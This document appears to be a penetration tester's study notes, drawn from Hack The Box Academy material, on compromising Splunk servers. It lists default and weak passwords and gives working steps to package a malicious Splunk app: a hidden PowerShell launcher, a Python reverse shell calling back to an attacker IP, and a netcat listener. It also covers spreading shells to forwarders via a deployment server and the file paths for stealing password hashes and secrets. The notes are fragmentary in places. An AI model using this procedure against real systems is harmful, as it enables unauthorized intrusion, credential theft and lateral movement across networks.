
default credentials: `admin`: `changeme`
## Splunk
- [ ] default creds checked
- [ ] version enumerated
register via expired license
- [ ] upload vuln plugin /RCE

admin access to Splunk gives us the ability to deploy custom applications that can be used to quickly compromise a Splunk server and possibly other hosts in the network depending on the way Splunk is set up.

Let's imagine that we uncover a forgotten instance of Splunk in our Aquatone report that has since automatically converted to the free version, which does not require authentication. Since we have yet to gain a foothold in the internal network, let's focus our attention on Splunk and see if we can turn this access into RCE.

The latest version of Splunk sets credentials during the installation process. If the default credentials do not work, it is worth checking for common weak passwords such as `admin`, `changeme`, `Welcome`, `Welcome1`, `Password123`, etc.

Once logged in to Splunk (or having accessed an instance of Splunk Free), we can browse data, run reports, create dashboards, install applications from the Splunkbase library, and install custom applications.
![](https://academy.hackthebox.com/storage/modules/113/splunk_home.png)

Splunk has multiple ways of running code, such as server-side Django applications, REST endpoints, scripted inputs, and alerting scripts. A common method of gaining remote code execution on a Splunk server is through the use of a scripted input.

As Splunk can be installed on Windows or Linux hosts, scripted inputs can be created to run Bash, PowerShell, or Batch scripts. Also, every Splunk installation comes with Python installed, so Python scripts can be run on any Splunk system. A quick way to gain RCE is by creating a scripted input that tells Splunk to run a Python reverse shell script. We'll cover this in the next section.
Aside from this built-in functionality, 
# RCE using Splunk

We can use [this](https://github.com/0xjpuff/reverse_shell_splunk) Splunk package to assist us. The `bin` directory in this repo has examples for [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) and [PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1). Let's walk through this step-by-step.
```shell-session
$ git clone https://github.com/0xjpuff/reverse_shell_splunk.git
$ tree splunk_shell/

splunk_shell/
├── bin
└── default

2 directories, 0 files
```

scripts are in bin, input.conf configures splunk interactions with the app
such as enable, interval.
### Windows 
We need the .bat file, which will run when the application is deployed and execute the PowerShell one-liner.

`run.bat`
```
@ECHO OFF
PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
Exit
```

Once the files are created, we can create a tarball or `.spl` file.
```shell-session
tar -cvzf updater.tar.gz splunk_shell/

splunk_shell/
splunk_shell/bin/
splunk_shell/bin/rev.py
splunk_shell/bin/run.bat
splunk_shell/bin/run.ps1
splunk_shell/default/
splunk_shell/default/inputs.conf
```

Before uploading the malicious custom app, let's start a listener
```shell-session
$ sudo nc -lnvp 443

listening on [any] 443 ...
```

install app at :`https://IP/en-US/manager/search/apps/local`

If we were dealing with a Linux host, we would need to edit the `rev.py` Python script before creating the tarball and uploading the custom malicious app. The rest of the process would be the same, and we would get a reverse shell connection on our Netcat listener and be off to the races.

```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```



If the compromised Splunk host is a deployment server

If the compromised Splunk host is a deployment server, it will likely be possible to achieve RCE on any hosts with Universal Forwarders installed on them. To push a reverse shell out to other hosts, the application must be placed in the `$SPLUNK_HOME/etc/deployment-apps` directory on the compromised host. In a Windows-heavy environment, we will need to create an application using a PowerShell reverse shell since the Universal forwarders do not install with Python like the Splunk server.
## splunk directory traversal
### splunk auth config file paths ( to grab password hash):
- `/etc/system/local/authentication.conf`
- `/etc/system/default/authentication.conf`
### splunk secrets
- `etc/auth/splunk.secret`

decrypt splunk password using splunksecrets
```
spls splunk-decrypt  -S splunk.secret  --ciphertext `<hash>`
```